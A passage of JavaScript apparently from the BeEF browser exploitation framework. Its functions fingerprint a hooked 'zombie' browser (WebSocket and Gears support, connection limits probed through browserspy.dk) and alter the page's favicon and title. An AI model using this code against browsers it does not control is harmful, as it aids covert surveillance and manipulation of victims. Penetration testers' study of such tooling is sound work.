     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket:function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears:function () {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon:function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle:function (title) {
        document.title = title;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per domain, or globally on all domains.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $j.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections:function (scope) {

        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
        // The token will be replaced by a different number with each request(different domain).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";


        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $j.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $j.ajax({
                    type:"get",
                    dataType:true,
                    url:(testUrl.replace("<token>", i)) + Math.random(),
                    data:"",
                    timeout:(secondsTimeout * 1000),

                    // Function on completion of request.
                    complete:function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');
